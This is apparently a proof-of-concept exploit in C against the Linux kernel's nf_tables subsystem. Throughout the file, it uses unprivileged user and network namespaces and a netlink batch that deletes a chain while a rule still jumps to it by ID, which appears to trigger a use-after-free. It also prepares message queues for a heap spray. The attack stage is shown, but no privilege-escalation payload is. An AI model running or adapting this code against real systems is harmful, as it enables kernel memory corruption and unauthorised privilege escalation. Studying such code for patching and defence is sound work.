#define _GNU_SOURCE
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <stddef.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/msg.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/mman.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nf_tables_compat.h>
#include <linux/netfilter/xt_AUDIT.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include "libfunc.h"

#define PAGE_SIZE 0x1000

// gcc exploit.c libfunc.c -o exploit -lmnl -lnftnl -no-pie

// msg_msg stuff
#define NUM_MSQIDS 1024

int msqid[NUM_MSQIDS];

// Request compat
int request_compat(struct mnl_socket *nl, const char *name, uint32_t rev, uint32_t type, int seq)
{
    int err = 0, rseq;
    struct nlmsghdr *nlh;
    struct nfgenmsg *msg;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    printf("[+] Requesting compat module: %s\n", name);

    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_type = (NFNL_SUBSYS_NFT_COMPAT << 8) | NFNL_MSG_COMPAT_GET;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = rseq = seq++;

    msg = mnl_nlmsg_put_extra_header(nlh, sizeof(*msg));
    msg->nfgen_family = AF_INET;
    msg->version = NFNETLINK_V0;
    msg->res_id = 0;

    mnl_attr_put_strz(nlh, NFTA_COMPAT_NAME, name);
    mnl_attr_put_u32(nlh, NFTA_COMPAT_REV, htonl(rev));
    mnl_attr_put_u32(nlh, NFTA_COMPAT_TYPE, htonl(type));

    mnl_socket_sendto(nl, nlh, nlh->nlmsg_len);

    return err;
}

// Setup
void setup_stuff(void) {
    cpu_set_t pwn_cpu;
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &pwn_cpu) < 0) {
        perror("[!] sched_setaffinity");
        exit(-1);
    }
}

// main
int main(void) {  
    // Parameters
    // Table
    char *table_name = "test_table";
    uint8_t family = NFPROTO_IPV4;
    // Chain
    char *chain_name = "AAAAAAAAAAAAAAAAAAAA";
    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_OUT;
    bp.prio = 10;
    // Netlink batch message
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    struct mnl_nlmsg_batch *batch;
    int ret;
    int seq = time(NULL);
    int rseq = seq;

    // Setup
    setup_stuff();
    unshare(CLONE_NEWUSER);
    unshare(CLONE_NEWNET);

    // Open netlink socket
    struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL)
		perror("mnl_socket_open");
	
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
		perror("mnl_socket_bind");
    
    // Setup message queues
    printf("[+] Setting up msg queues\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
            perror("[!] msgget failed");
            exit(-1);
        }
    }
    
    // Request compat
    request_compat(nl, "AUDIT", 0, 1, seq);
    printf("\n");
    
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);
    
    // Create table 
    struct nftnl_table *t = build_table(table_name, NFPROTO_IPV4);
    family = nftnl_table_get_u32(t, NFTNL_TABLE_FAMILY);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, t);
    nftnl_table_free(t);
    mnl_nlmsg_batch_next(batch);
    
    // Create chain 1
    struct nftnl_chain *c = build_chain(table_name, chain_name, NULL, 0x1234);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, c);
	mnl_nlmsg_batch_next(batch);
    
    // Delete chain 1
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, c);
    nftnl_chain_free(c); 
    mnl_nlmsg_batch_next(batch);
    
    // Create chain 2
    struct nftnl_chain *c2 = build_chain(table_name, "chain2", &bp, 10);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, c2);
	nftnl_chain_free(c2);
	mnl_nlmsg_batch_next(batch);
    
    // Create rule pointing to chain 1
    struct nftnl_rule *r = build_rule(table_name, "chain2", family, NULL);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE | NLM_F_ACK, seq++); 
    // Add immediate expr to rule
    struct nftnl_expr *e = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_CHAIN_ID, 0x1234);
    nftnl_rule_add_expr(r, e); 
    nftnl_rule_nlmsg_build_payload(nlh, r);
    mnl_nlmsg_batch_next(batch); 

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Send netlink message
    printf("[+] Sending netlink message 1\n");
	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("mnl_socket_sendto");
	}
    mnl_nlmsg_batch_stop(batch);

    return 0;
}